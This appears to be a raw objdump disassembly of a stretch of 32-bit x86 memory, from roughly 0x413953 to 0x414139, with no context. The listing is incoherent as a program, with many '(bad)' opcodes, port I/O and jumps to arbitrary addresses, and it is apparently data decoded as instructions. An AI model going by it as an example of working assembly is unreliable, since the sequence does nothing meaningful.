  413953:	cmp    DWORD PTR [ecx],ecx
  413955:	mov    esp,0x8ef6a45a
  41395a:	mov    ch,0x86
  41395c:	inc    ecx
  41395d:	icebp  
  41395e:	mov    esi,0xef9b965d
  413963:	call   FWORD PTR [edx]
  413965:	(bad)  
  413966:	retf   
  413967:	(bad)  
  413968:	clc    
  413969:	mov    al,ds:0x4b770f87
  41396e:	pop    edi
  41396f:	jo     0x413984
  413971:	mov    ebx,0x24672821
  413976:	pop    es
  413977:	jnp    0x4139ae
  413979:	or     al,0x6a
  41397b:	and    DWORD PTR [ecx],ecx
  41397d:	and    eax,0x7b9ad8d0
  413982:	js     0x4139cf
  413984:	cmp    DWORD PTR ds:0x2ea29a5,0x55
  41398b:	pop    edi
  41398c:	xor    dh,dl
  41398e:	rol    BYTE PTR [eax+ecx*4+0x36],cl
  413992:	cmp    BYTE PTR [ebx+0x51],dh
  413995:	ins    BYTE PTR es:[edi],dx
  413996:	ss faddp st(1),st
  413999:	mov    ch,0x9
  41399b:	sub    DWORD PTR [edi+0x8bf8ae9],ecx
  4139a1:	jb     0x4139dd
  4139a3:	sti    
  4139a4:	jbe    0x413943
  4139a6:	in     al,dx
  4139a7:	call   0xbb35:0x543ef1e3
  4139ae:	jo     0x413958
  4139b0:	fxch   st(3)
  4139b2:	in     eax,0x7
  4139b4:	mov    es,edx
  4139b6:	xchg   BYTE PTR [edi-0x1a],dh
  4139b9:	mov    dh,0x65
  4139bb:	add    al,0x2d
  4139bd:	cmp    ebp,DWORD PTR [esi+0x28]
  4139c0:	imul   edi,DWORD PTR [edi],0x7a080e19
  4139c6:	and    ebx,DWORD PTR [ebx]
  4139c8:	fistp  WORD PTR [ebp-0xecf6e23]
  4139ce:	fs add ebp,eax
  4139d1:	mov    eax,esp
  4139d3:	jge    0x413a20
  4139d5:	dec    edx
  4139d6:	xor    esi,DWORD PTR [ecx+0x78]
  4139d9:	repnz dec ebx
  4139db:	in     al,0x28
  4139dd:	jmp    FWORD PTR [eax+ebp*1-0x32]
  4139e1:	xchg   ebx,eax
  4139e2:	mov    ah,0x88
  4139e4:	fwait
  4139e5:	push   ecx
  4139e6:	push   ecx
  4139e7:	sub    DWORD PTR [esi],ebp
  4139e9:	popf   
  4139ea:	in     eax,0x6a
  4139ec:	lock mov cl,0x67
  4139ef:	pop    ds
  4139f0:	fisttp DWORD PTR [edi+eax*4-0x19]
  4139f4:	loope  0x41399b
  4139f6:	loop   0x413989
  4139f8:	and    esp,ebx
  4139fa:	sub    DWORD PTR [ecx],ebp
  4139fc:	add    edx,DWORD PTR [esi+0x68169c87]
  413a02:	fwait
  413a03:	jmp    0x4139b3
  413a05:	icebp  
  413a06:	imul   edi,DWORD PTR [edi+ebp*8],0xbf6dccea
  413a0d:	push   ebx
  413a0e:	sbb    al,0x29
  413a10:	sahf   
  413a11:	sub    DWORD PTR [edi+0x59fc0867],edi
  413a17:	sbb    eax,0xc59f3f2
  413a1c:	rcl    BYTE PTR [ecx],0x79
  413a1f:	(bad)  
  413a20:	scas   eax,DWORD PTR es:[edi]
  413a21:	xchg   ebp,eax
  413a22:	push   esi
  413a23:	pop    edx
  413a24:	ss inc ebx
  413a26:	nop
  413a27:	push   0x96867440
  413a2c:	or     BYTE PTR [esi+0x46],bh
  413a2f:	nop
  413a30:	jecxz  0x413aaf
  413a32:	and    ah,BYTE PTR [ecx]
  413a34:	push   cs
  413a35:	lock mov esp,0xfcb15acf
  413a3b:	iretw  
  413a3d:	sbb    dl,dh
  413a3f:	mov    ds:0x933b8088,al
  413a45:	mov    al,0xdb
  413a47:	pop    edi
  413a48:	popf   
  413a49:	lock xchg edx,eax
  413a4b:	popa   
  413a4c:	out    0xaa,eax
  413a4e:	cmp    eax,DWORD PTR [eax+ebp*2]
  413a51:	mov    ebx,0x7196e2b9
  413a56:	xchg   DWORD PTR [ebp+0x32],ecx
  413a59:	push   ecx
  413a5a:	mov    bh,0x4f
  413a5c:	out    dx,eax
  413a5d:	lds    ecx,FWORD PTR [edx+0x67f7152f]
  413a63:	not    DWORD PTR [ecx-0x31]
  413a66:	push   0x1fb20828
  413a6b:	mov    esi,0xf51956fd
  413a70:	jno    0x413a63
  413a72:	and    dl,BYTE PTR [edx-0xf]
  413a75:	std    
  413a76:	out    dx,eax
  413a77:	aad    0x20
  413a79:	test   DWORD PTR [ebp-0x48],esi
  413a7c:	cpuid  
  413a7e:	popa   
  413a7f:	rol    DWORD PTR ds:0xe3f33154,cl
  413a85:	cmp    BYTE PTR gs:[eax+0x281e2e49],0xa4
  413a8d:	shr    ecx,0x81
  413a90:	test   ecx,0x40ad0536
  413a96:	push   edi
  413a97:	adc    BYTE PTR [ecx+esi*8-0x32],al
  413a9b:	in     al,dx
  413a9c:	cwde   
  413a9d:	mov    al,0xad
  413a9f:	arpl   WORD PTR [esi-0x14],dx
  413aa2:	out    0xac,eax
  413aa4:	aas    
  413aa5:	xchg   DWORD PTR es:[ebx-0x54149566],esp
  413aac:	out    dx,eax
  413aad:	cld    
  413aae:	xchg   BYTE PTR [eax],ch
  413ab0:	or     eax,0x15f2deb3
  413ab5:	pop    edx
  413ab6:	or     ecx,esi
  413ab8:	mov    dl,0x70
  413aba:	out    0x50,eax
  413abc:	add    BYTE PTR [esi],ah
  413abe:	inc    esp
  413abf:	call   0x29d44387
  413ac4:	jb     0x413ab2
  413ac6:	jns    0x413b31
  413ac8:	xor    BYTE PTR [esi+edi*1-0x65],dh
  413acc:	not    ebp
  413ace:	sbb    BYTE PTR [edi+eiz*8],0x12
  413ad2:	out    dx,eax
  413ad3:	ins    DWORD PTR es:[edi],dx
  413ad4:	iret   
  413ad5:	or     BYTE PTR [bp+si],ch
  413ad8:	lahf   
  413ad9:	jns    0x413ae8
  413adb:	lds    esp,FWORD PTR [ebx+0x7d496183]
  413ae1:	xchg   edx,eax
  413ae2:	xchg   BYTE PTR ds:0x4275e5c9,ch
  413ae8:	(bad)  [esi]
  413aea:	mov    esi,0xab4e9929
  413aef:	cld    
  413af0:	or     BYTE PTR [esi-0x4e],bl
  413af3:	scas   eax,DWORD PTR es:[edi]
  413af4:	pop    edi
  413af5:	xchg   ecx,eax
  413af6:	mov    cl,BYTE PTR [edi-0x2d]
  413af9:	into   
  413afa:	xor    al,0xe
  413afc:	inc    esp
  413afd:	jb     0x413b1d
  413aff:	push   esi
  413b00:	mov    dl,0x5e
  413b02:	inc    ebx
  413b03:	inc    ebx
  413b04:	jne    0x413b70
  413b06:	cmp    DWORD PTR [eax-0x19],ebp
  413b09:	sub    DWORD PTR [esi+0x758705b],eax
  413b0f:	test   al,0x1
  413b11:	std    
  413b12:	push   eax
  413b13:	sub    ch,dh
  413b15:	push   ebx
  413b16:	xchg   esi,eax
  413b17:	inc    ebp
  413b18:	or     BYTE PTR [edx-0x4778895a],al
  413b1e:	jb     0x413b13
  413b20:	push   esp
  413b21:	sti    
  413b22:	out    0x6c,al
  413b24:	outs   dx,BYTE PTR ds:[esi]
  413b25:	jno    0x413b7a
  413b27:	(bad)  
  413b29:	jns    0x413ab5
  413b2b:	sub    DWORD PTR [eax],ecx
  413b2d:	push   esi
  413b2e:	xchg   esp,eax
  413b2f:	out    dx,eax
  413b30:	push   0xffffffe0
  413b32:	mov    eax,0x9ef039f0
  413b37:	int3   
  413b38:	test   bh,bl
  413b3a:	sub    al,0x3a
  413b3c:	xchg   edx,eax
  413b3d:	test   eax,0x934ec2fc
  413b42:	mov    DWORD PTR [ecx+0x73f1d757],edx
  413b48:	and    cl,dh
  413b4a:	dec    edx
  413b4b:	jae    0x413b97
  413b4d:	scas   al,BYTE PTR es:[edi]
  413b4e:	into   
  413b4f:	dec    edi
  413b50:	jl     0x413b03
  413b52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b53:	push   ds
  413b54:	lahf   
  413b55:	(bad)  
  413b56:	mov    ss,WORD PTR [ebx+0x8]
  413b59:	dec    ebp
  413b5a:	jl     0x413ba8
  413b5c:	arpl   ax,si
  413b5e:	xor    al,0x43
  413b60:	inc    ecx
  413b61:	sub    edx,DWORD PTR [edx+0x443a88a1]
  413b67:	mov    esi,0xad805d95
  413b6c:	push   ebx
  413b6d:	push   ecx
  413b6e:	repz not DWORD PTR [ecx]
  413b71:	in     al,dx
  413b72:	xor    ch,BYTE PTR [edx+0x56]
  413b75:	push   ebp
  413b76:	sbb    cl,al
  413b78:	or     al,0xba
  413b7a:	stc    
  413b7b:	sub    dh,cl
  413b7d:	sti    
  413b7e:	data16 outs dx,BYTE PTR ds:[esi]
  413b80:	or     BYTE PTR [edx-0x14c26595],ch
  413b86:	jmp    0xd7392dfa
  413b8b:	repnz cmp ebx,edx
  413b8e:	ror    ch,1
  413b90:	dec    ecx
  413b91:	pop    ss
  413b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b93:	stos   BYTE PTR es:[edi],al
  413b94:	cld    
  413b95:	xor    al,0xca
  413b97:	(bad)  
  413b98:	and    esi,ecx
  413b9a:	cli    
  413b9b:	imul   edi,DWORD PTR [ecx+0x10f2733d],0xfffffff7
  413ba2:	call   0xd6012600
  413ba7:	inc    ebp
  413ba8:	sub    BYTE PTR [ecx],bl
  413baa:	sub    bl,BYTE PTR [edx-0x9]
  413bad:	das    
  413bae:	pop    ds
  413baf:	push   edx
  413bb0:	push   edx
  413bb1:	push   ecx
  413bb2:	je     0x413b51
  413bb4:	push   esp
  413bb5:	int    0xd8
  413bb7:	and    DWORD PTR [ebx-0x10],ebp
  413bba:	inc    ebp
  413bbb:	pop    esp
  413bbc:	into   
  413bbd:	in     eax,0x30
  413bbf:	mov    ch,0x6b
  413bc1:	out    0xfd,al
  413bc3:	int    0xa2
  413bc5:	mov    esi,0xf31408e7
  413bca:	out    0x3d,al
  413bcc:	iret   
  413bcd:	outs   dx,DWORD PTR ds:[esi]
  413bce:	or     edx,DWORD PTR [esi-0x33]
  413bd1:	xor    ch,dh
  413bd3:	iret   
  413bd4:	div    DWORD PTR [edi+0x53616565]
  413bda:	dec    ebx
  413bdb:	clc    
  413bdc:	xor    edi,0x415d9a62
  413be2:	mov    edi,esp
  413be4:	js     0x413bbb
  413be6:	sbb    al,BYTE PTR [ebp+0x13]
  413be9:	and    al,0x44
  413beb:	cmp    esp,edi
  413bed:	xor    ebx,esi
  413bef:	push   es
  413bf0:	lods   al,BYTE PTR ds:[esi]
  413bf1:	outs   dx,BYTE PTR gs:[esi]
  413bf3:	add    eax,0xfa698c1
  413bf8:	in     eax,0xf2
  413bfa:	(bad)  [ecx]
  413bfc:	jmp    0x56739713
  413c01:	mov    al,0x86
  413c03:	jns    0x413b85
  413c05:	sbb    dh,BYTE PTR [edx-0x352b3c7c]
  413c0b:	sub    BYTE PTR [edx+0x84e930d],ah
  413c11:	jp     0x413c2e
  413c13:	xor    ebp,DWORD PTR [edx+0x219a4ce7]
  413c19:	lock lock fld QWORD PTR [edx-0x7e]
  413c1e:	out    dx,al
  413c1f:	pop    eax
  413c20:	push   es
  413c21:	and    al,0xe
  413c23:	mov    dl,0x13
  413c25:	retf   0x8987
  413c28:	mov    ds:0x99ee8e26,eax
  413c2d:	push   0x5b3b29c9
  413c32:	jmp    0x413bd2
  413c34:	xchg   ecx,eax
  413c35:	(bad)  
  413c36:	test   BYTE PTR [ecx+ebx*2-0x5bd718c9],0xc1
  413c3e:	cwde   
  413c3f:	fs aaa 
  413c41:	jg     0x413c8a
  413c43:	xor    al,0xc8
  413c45:	test   DWORD PTR [ebp+0x3f],edx
  413c48:	cmp    eax,0x92179e6d
  413c4d:	outs   dx,BYTE PTR ds:[esi]
  413c4e:	xchg   DWORD PTR [ebp-0x64a4d16a],ecx
  413c54:	inc    edi
  413c55:	push   esi
  413c56:	dec    eax
  413c57:	das    
  413c58:	dec    ebx
  413c59:	aaa    
  413c5a:	pushf  
  413c5b:	jle    0x413c4a
  413c5d:	or     eax,0x5f089846
  413c62:	cdq    
  413c63:	ret    
  413c64:	or     dh,BYTE PTR [eax]
  413c66:	stc    
  413c67:	sub    ah,bl
  413c69:	lock mov edx,0xbf780faf
  413c6f:	cmp    ch,BYTE PTR [eax]
  413c71:	mov    cs,WORD PTR [edx-0x4c]
  413c74:	cmc    
  413c75:	leave  
  413c76:	xchg   cl,dh
  413c78:	push   0x15
  413c7a:	or     al,0x6c
  413c7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c7d:	imul   ecx,DWORD PTR [eax],0x60
  413c80:	jnp    0x413cd0
  413c82:	call   0x954f:0x21e46729
  413c89:	inc    ebp
  413c8a:	xor    DWORD PTR [ebp+0x16],0xa3c0bd90
  413c91:	repnz sbb ch,BYTE PTR [eax-0x11]
  413c95:	es dec ecx
  413c97:	xchg   ebx,eax
  413c98:	sbb    BYTE PTR [eax+0x3f],al
  413c9b:	pop    edx
  413c9c:	xor    BYTE PTR [edx-0x57f480ce],dh
  413ca2:	ret    0xdd9a
  413ca5:	cmc    
  413ca6:	mov    ds:0x25f1e698,al
  413cab:	cs (bad) 
  413cae:	adc    BYTE PTR [ebx+0x41],dh
  413cb1:	mov    edx,0x4847026f
  413cb6:	scas   al,BYTE PTR es:[edi]
  413cb7:	sar    BYTE PTR [edx-0x57],1
  413cba:	xchg   BYTE PTR [ecx],ch
  413cbc:	in     al,0x0
  413cbe:	mov    esi,0xff1077f4
  413cc3:	adc    BYTE PTR [edx],cl
  413cc5:	(bad)  
  413cc6:	in     eax,0x29
  413cc8:	sbb    BYTE PTR [ebx-0x7f],ah
  413ccb:	loopne 0x413cd5
  413ccd:	and    al,0x5e
  413ccf:	xor    dl,bl
  413cd1:	aad    0x59
  413cd3:	mov    dl,0x50
  413cd5:	mov    ebp,0xf6d85804
  413cda:	rcl    BYTE PTR [ebx*8-0x5bd4bc0c],1
  413ce1:	(bad)  
  413ce3:	rcl    BYTE PTR [edx],cl
  413ce5:	or     BYTE PTR [edi-0x1de2c1c1],al
  413ceb:	sub    edi,ecx
  413ced:	xchg   esi,eax
  413cee:	scas   eax,DWORD PTR es:[edi]
  413cef:	xor    eax,0x1097c281
  413cf4:	shl    DWORD PTR [edi+0x6f],cl
  413cf7:	test   eax,0xd4bfb408
  413cfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cfd:	add    DWORD PTR [ebx+0x2bc13fb7],esi
  413d03:	stos   BYTE PTR es:[edi],al
  413d04:	pop    ebp
  413d05:	shr    BYTE PTR [bx+di],cl
  413d08:	cwde   
  413d09:	cmp    dl,cl
  413d0b:	jge    0x413d15
  413d0d:	xor    al,0xa
  413d0f:	mov    eax,ds:0xa6741a1e
  413d14:	pop    es
  413d15:	icebp  
  413d16:	(bad)  
  413d17:	out    0x71,al
  413d19:	push   ebp
  413d1a:	mov    eax,0x5b62e0c9
  413d1f:	test   DWORD PTR [esi-0xe],esi
  413d22:	hlt    
  413d23:	repz jnp 0x413d6d
  413d26:	cdq    
  413d27:	push   ebx
  413d28:	(bad)
  413d2c:	jecxz  0x413d42
  413d2e:	clc    
  413d2f:	clc    
  413d30:	xchg   ebx,eax
  413d31:	nop
  413d32:	mov    al,ds:0xd33b042a
  413d37:	in     al,0x4b
  413d39:	retf   
  413d3a:	mov    edx,0x8640f099
  413d3f:	jg     0x413dbb
  413d41:	mov    esp,0xf25d85b6
  413d46:	sub    bh,BYTE PTR fs:[eax-0x25]
  413d4a:	das    
  413d4b:	int    0xdb
  413d4d:	cmp    BYTE PTR [edx],0xd8
  413d50:	mov    al,0x52
  413d52:	test   DWORD PTR [ebx+0x37a80ec5],ecx
  413d58:	cwde   
  413d59:	icebp  
  413d5a:	outs   dx,BYTE PTR ds:[esi]
  413d5b:	mov    ?,WORD PTR [ebp+ecx*1+0x69]
  413d5f:	ds ret 0xcbf
  413d63:	and    DWORD PTR [ebp+0x10],ebp
  413d66:	xchg   DWORD PTR [edi],ecx
  413d68:	dec    edi
  413d69:	dec    ecx
  413d6a:	push   esp
  413d6b:	rol    DWORD PTR [edi+0x7a2dfdf5],1
  413d71:	adc    DWORD PTR [ecx+0x76a04f0],0x874611f4
  413d7b:	xlat   BYTE PTR ds:[ebx]
  413d7c:	repnz cmp ah,BYTE PTR [esi-0xc570950]
  413d83:	mov    BYTE PTR [ecx],dh
  413d85:	add    al,0x9c
  413d87:	sub    BYTE PTR [ebx+0xe],bl
  413d8a:	sub    DWORD PTR [ecx-0x7383bff1],edi
  413d90:	cmp    ecx,DWORD PTR [ecx-0xb44d445]
  413d96:	mov    eax,0xd8f9b9
  413d9b:	push   es
  413d9c:	in     eax,0x7b
  413d9e:	sbb    ebp,DWORD PTR [ecx]
  413da0:	inc    edx
  413da1:	push   es
  413da2:	in     al,dx
  413da3:	scas   eax,DWORD PTR es:[edi]
  413da4:	rcl    BYTE PTR [edi+eax*4+0x3b],1
  413da8:	ftst   
  413daa:	cmp    eax,0xe6a45f5a
  413daf:	das    
  413db0:	and    edx,DWORD PTR [esi]
  413db2:	inc    esp
  413db3:	and    DWORD PTR [esi+0x20fec0f1],0x54cad76b
  413dbd:	xrelease xchg DWORD PTR [ebp+0x45],edi
  413dc1:	cmp    DWORD PTR [ecx+0x14],ebx
  413dc4:	mov    ebx,0x24290784
  413dc9:	pushf  
  413dca:	mov    esp,0xd8634d7
  413dcf:	dec    ebp
  413dd0:	rcl    edi,1
  413dd2:	ret    0xdfd1
  413dd5:	mov    ebx,0x113feb86
  413dda:	jmp    0x413e2e
  413ddc:	loope  0x413da5
  413dde:	scas   al,BYTE PTR es:[edi]
  413ddf:	(bad)  
  413de0:	adc    edx,DWORD PTR [ebp-0x7d]
  413de3:	cs ins BYTE PTR es:[edi],dx
  413de5:	push   ds
  413de6:	(bad)  
  413de7:	das    
  413de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413de9:	outs   dx,DWORD PTR ds:[esi]
  413dea:	(bad)  
  413deb:	and    bh,BYTE PTR [edi+0xe]
  413dee:	test   esi,0x378c681c
  413df4:	add    BYTE PTR [ebp-0xcd3d762],dl
  413dfa:	inc    esp
  413dfb:	shl    DWORD PTR [edi-0x74],cl
  413dfe:	xor    cl,BYTE PTR [esi-0x6fc68805]
  413e04:	mov    WORD PTR [edi-0x1879613a],ss
  413e0a:	xchg   cl,bh
  413e0c:	push   es
  413e0d:	daa    
  413e0e:	fsub   st,st(5)
  413e10:	aas    
  413e11:	mov    ebp,0xb0c2278e
  413e16:	push   edi
  413e17:	out    0x59,al
  413e19:	jmp    0x413e31
  413e1b:	jle    0x413e61
  413e1d:	jle    0x413e6d
  413e1f:	pop    esp
  413e20:	test   DWORD PTR [ebp+0x67],0xbdda7a42
  413e27:	(bad)  [esi-0xf]
  413e2a:	push   esp
  413e2b:	into   
  413e2c:	lds    ebp,FWORD PTR ds:0x47e44347
  413e32:	mov    esi,0x86f47665
  413e37:	add    ebp,ecx
  413e39:	fdiv   QWORD PTR [eax-0x79]
  413e3c:	call   0xb7cae20b
  413e41:	iret   
  413e42:	mov    eax,ds:0xe9707421
  413e47:	fadd   QWORD PTR [ebp+0x7bc0fa62]
  413e4d:	add    al,0x81
  413e4f:	sub    eax,0xb365c0a5
  413e54:	mov    ah,0xf0
  413e56:	add    dh,BYTE PTR [edx]
  413e58:	das    
  413e59:	jb     0x413eb4
  413e5b:	mov    edx,DWORD PTR [ecx-0x65056ff4]
  413e61:	lock bnd jno 0x413ebd
  413e65:	daa    
  413e66:	fcomi  st,st(2)
  413e68:	dec    eax
  413e69:	lock test al,0xbd
  413e6c:	or     ch,BYTE PTR [edx+0x78]
  413e6f:	and    al,0x8e
  413e71:	add    al,0x42
  413e73:	add    BYTE PTR [ebp-0x703079c7],al
  413e79:	jle    0x413e69
  413e7b:	xor    BYTE PTR [ebx+0x55342683],ch
  413e81:	sti    
  413e82:	les    ecx,FWORD PTR [ebp+0x4f]
  413e85:	cmp    al,0x46
  413e87:	inc    ecx
  413e88:	or     BYTE PTR [ebx+edx*2-0x564f4c87],bh
  413e8f:	cmc    
  413e90:	gs lock mov esp,0xc929747b
  413e97:	dec    esp
  413e98:	and    eax,0xffffff94
  413e9b:	and    esp,ebp
  413e9d:	lods   eax,DWORD PTR ds:[esi]
  413e9e:	xchg   ecx,esp
  413ea0:	push   cs
  413ea1:	cmp    ebx,DWORD PTR [esi+esi*2+0x2963b375]
  413ea8:	inc    ecx
  413ea9:	xchg   ebx,eax
  413eaa:	neg    DWORD PTR [ebp-0x14735bf8]
  413eb0:	xchg   ebx,eax
  413eb1:	loope  0x413f2a
  413eb3:	push   esp
  413eb4:	sub    al,0xf5
  413eb6:	xor    cl,BYTE PTR [ebp+0x3f]
  413eb9:	popa   
  413eba:	push   ebx
  413ebb:	lods   eax,DWORD PTR ds:[esi]
  413ebc:	mov    bh,0xde
  413ebe:	push   es
  413ebf:	pop    ecx
  413ec0:	adc    eax,0x9ec17aa8
  413ec5:	icebp  
  413ec6:	test   BYTE PTR [ebx+0x4f],dh
  413ec9:	mov    ch,0x87
  413ecb:	dec    edx
  413ecc:	add    edi,esp
  413ece:	jb     0x413ef9
  413ed0:	adc    eax,0x359da35f
  413ed5:	dec    edx
  413ed6:	cwde   
  413ed7:	add    BYTE PTR [edx+0x6382dceb],cl
  413edd:	rcl    DWORD PTR ds:[edx],0x5c
  413ee1:	lock mov dl,BYTE PTR es:[ebp+0x1bad2bcc]
  413ee9:	inc    ebp
  413eea:	pop    es
  413eeb:	pop    esp
  413eec:	popf   
  413eed:	stc    
  413eee:	xchg   BYTE PTR [ecx],bl
  413ef0:	rcl    cl,cl
  413ef2:	sbb    al,0x37
  413ef4:	dec    ebp
  413ef5:	xor    bh,bl
  413ef7:	sub    bl,ah
  413ef9:	xor    al,BYTE PTR [eax+eax*2-0x9]
  413efd:	xchg   ebp,eax
  413efe:	xchg   ebp,eax
  413eff:	bound  esp,QWORD PTR [edx-0x60]
  413f02:	pusha  
  413f03:	push   cs
  413f04:	jp     0x413ef7
  413f06:	dec    esp
  413f07:	mov    esp,0xc67b29f9
  413f0c:	fnstsw WORD PTR [edi+0x7d]
  413f0f:	rcr    BYTE PTR [edx+ebp*8-0x7a],0x2d
  413f14:	sbb    eax,0x3f3b0c6c
  413f19:	lock fs in al,0x3a
  413f1d:	mov    ah,0x54
  413f1f:	daa    
  413f20:	and    DWORD PTR [ebx],edi
  413f22:	arpl   WORD PTR [eax+eax*1-0x6f],dx
  413f26:	xchg   bh,bl
  413f28:	sub    DWORD PTR [esi+0x2],ebp
  413f2b:	adc    ch,ah
  413f2d:	mov    edi,0x3fde28ec
  413f32:	iret   
  413f33:	jmp    0x3f7d7d38
  413f38:	cld    
  413f39:	jo     0x413f72
  413f3b:	push   ebp
  413f3c:	pusha  
  413f3d:	jmp    0x413f46
  413f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f40:	jne    0x413f1f
  413f42:	mov    edi,0x89d7522e
  413f47:	retf   0x3591
  413f4a:	fsubr  DWORD PTR [edx]
  413f4c:	retf   
  413f4d:	dec    esp
  413f4e:	adc    eax,0xa0f88491
  413f53:	fist   WORD PTR [ebx]
  413f55:	cwde   
  413f56:	xchg   bl,ch
  413f58:	aas    
  413f59:	(bad)  
  413f5a:	js     0x413eef
  413f5c:	jp     0x413f5a
  413f5e:	inc    ebp
  413f5f:	mov    ss,WORD PTR [edi-0xfb79f3b]
  413f65:	mov    ebp,0x2d6e2ba8
  413f6a:	xchg   BYTE PTR [ecx],cl
  413f6c:	data16 loope 0x413fd5
  413f6f:	push   edx
  413f70:	in     eax,0xa
  413f72:	push   ss
  413f73:	sub    DWORD PTR [ecx-0x72],eax
  413f76:	mov    edx,0xad4c08b8
  413f7b:	dec    ebp
  413f7c:	add    al,0xdc
  413f7e:	sbb    eax,0x332c5861
  413f83:	mov    esi,0x28487313
  413f88:	lods   al,BYTE PTR ds:[esi]
  413f89:	icebp  
  413f8a:	cdq    
  413f8b:	cli    
  413f8c:	call   0x2e80e644
  413f91:	push   0xffffff87
  413f93:	arpl   ax,sp
  413f95:	push   edx
  413f96:	push   ss
  413f97:	repz pop ebp
  413f99:	int3   
  413f9a:	jmp    0x413f44
  413f9c:	and    al,BYTE PTR [ecx+0x9]
  413f9f:	popa   
  413fa0:	push   cs
  413fa1:	mov    dh,0x42
  413fa3:	and    al,0x1d
  413fa5:	cs retf 0xc089
  413fa9:	add    eax,0x453778ef
  413fae:	int3   
  413faf:	es retf 
  413fb1:	mov    cl,0x30
  413fb3:	sbb    ebx,DWORD PTR [ebx-0x428122b6]
  413fb9:	test   DWORD PTR [edi-0x719126e3],eax
  413fbf:	nop
  413fc0:	inc    ecx
  413fc1:	or     cl,cl
  413fc3:	push   esi
  413fc4:	(bad)  
  413fc5:	lock hlt 
  413fc7:	das    
  413fc8:	retf   0x1fdb
  413fcb:	or     ebp,ebx
  413fcd:	pop    ecx
  413fce:	pop    ecx
  413fcf:	add    ebx,ebx
  413fd1:	in     al,0x86
  413fd3:	jae    0x414009
  413fd5:	cs jmp 0x2091dcf9
  413fdb:	sub    DWORD PTR [ecx+0x95789c1],eax
  413fe1:	mov    WORD PTR [esi+edi*8-0x1854b837],ss
  413fe8:	shl    ah,0xfc
  413feb:	(bad)  
  413fec:	pop    eax
  413fed:	mov    edi,0x70a2948f
  413ff2:	mov    edx,0xb2f6f2bd
  413ff7:	stc    
  413ff8:	iret   
  413ff9:	fld    TBYTE PTR [ebx-0x272097b7]
  413fff:	call   DWORD PTR [esi]
  414001:	pop    esi
  414002:	or     eax,0x1308423
  414007:	punpckldq mm6,DWORD PTR [esp+esi*4]
  41400b:	sbb    BYTE PTR [edi-0x43],0x95
  41400f:	sub    BYTE PTR [ecx],dh
  414011:	push   0x160bc609
  414016:	ret    
  414017:	lock cmp esp,DWORD PTR [ebp+0x5a]
  41401b:	jae    0x413fad
  41401d:	cmp    eax,0x7f194ada
  414022:	dec    eax
  414023:	and    DWORD PTR [eax],edi
  414025:	jg     0x413fc4
  414027:	sub    DWORD PTR ds:0xf788140d,ecx
  41402d:	mov    bl,0xf5
  41402f:	add    ecx,esp
  414031:	stc    
  414032:	(bad)  
  414034:	div    al
  414036:	pusha  
  414037:	dec    ecx
  414038:	test   eax,0xf36b9582
  41403d:	inc    DWORD PTR [ebx-0x1e]
  414040:	test   DWORD PTR [edx-0x79],ebp
  414043:	cdq    
  414044:	or     esp,edi
  414046:	in     al,dx
  414047:	xor    eax,0x28b83f73
  41404c:	cmp    eax,0x8c4e937
  414051:	mov    dh,0xe6
  414053:	sti    
  414054:	das    
  414055:	dec    ecx
  414056:	and    al,0x32
  414058:	or     esi,edx
  41405a:	mov    ds:0x5ea72446,al
  41405f:	pop    ds
  414060:	xchg   BYTE PTR [ecx-0xf],cl
  414063:	dec    edi
  414064:	mul    DWORD PTR [ecx-0x5d]
  414067:	adc    eax,0x660fbe81
  41406c:	sbb    al,0xef
  41406e:	jmp    0x667c:0x73dedcd2
  414075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414076:	mov    ecx,0x7c44734
  41407b:	adc    BYTE PTR [edi],cl
  41407d:	pop    esp
  41407e:	jo     0x414057
  414080:	pop    ds
  414081:	in     eax,dx
  414082:	mov    ds:0xcf2fe87b,eax
  414087:	addr16 mov ch,0xf1
  41408a:	int3   
  41408b:	(bad)  
  41408c:	sahf   
  41408d:	or     eax,0x69509681
  414092:	dec    esp
  414093:	xchg   ebp,eax
  414094:	xor    eax,0x418764
  414099:	scas   al,BYTE PTR es:[edi]
  41409a:	add    DWORD PTR [edi+ebp*8-0x3f],0xffffff99
  41409f:	sub    DWORD PTR [edi],esi
  4140a1:	pop    ebp
  4140a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140a3:	mov    edx,0x9cbce808
  4140a8:	sub    ah,BYTE PTR [eax+eiz*2-0x75ea0647]
  4140af:	pop    esi
  4140b0:	das    
  4140b1:	inc    edi
  4140b2:	or     eax,0x87bfd850
  4140b7:	jle    0x41407e
  4140b9:	cmp    edx,DWORD PTR [edx+ebx*1-0x5879d649]
  4140c0:	ror    dh,cl
  4140c2:	packsswb mm4,QWORD PTR [ebx+0x16]
  4140c6:	sub    BYTE PTR gs:[esi-0x6f],al
  4140ca:	xor    cl,BYTE PTR [eax+0x1f0e5f7]
  4140d0:	fnstsw WORD PTR [ebx-0xf792523]
  4140d6:	push   eax
  4140d7:	xor    eax,0xbaac3b34
  4140dc:	sar    BYTE PTR [ebp-0x43],1
  4140df:	sar    ch,1
  4140e1:	add    al,0x87
  4140e3:	popf   
  4140e4:	nop
  4140e5:	or     eax,0x83a53ef1
  4140ea:	lea    ebp,[ecx]
  4140ec:	fcom   DWORD PTR [ecx+0x2f]
  4140ef:	mov    dh,0xf4
  4140f1:	loop   0x414129
  4140f3:	mov    al,ds:0xb185ae5e
  4140f8:	ror    BYTE PTR [esi],0x46
  4140fb:	jle    0x4140d3
  4140fd:	lock or al,0x60
  414100:	fwait
  414101:	mov    eax,ds:0xe01ad69d
  414106:	mov    edx,0xb0f00572
  41410b:	data16 aam 0x49
  41410e:	ins    DWORD PTR es:[edi],dx
  41410f:	dec    esp
  414110:	test   eax,0x612859b9
  414115:	arpl   WORD PTR [ebp-0x23],ax
  414118:	or     BYTE PTR [edx+0x664bacb3],ch
  41411e:	popf   
  41411f:	call   0x8fde33b5
  414124:	and    BYTE PTR [eax+0x28],al
  414127:	(bad)  
  414128:	push   edi
  414129:	sbb    BYTE PTR [ebx],dl
  41412b:	and    cl,BYTE PTR [ebx]
  41412d:	and    bh,BYTE PTR [edx]
  41412f:	or     ecx,edi
  414131:	mov    ss,esi
  414133:	inc    edi
  414134:	rcr    ch,1
  414136:	sbb    al,ch
  414138:	pop    ss
  414139:	push   ebp
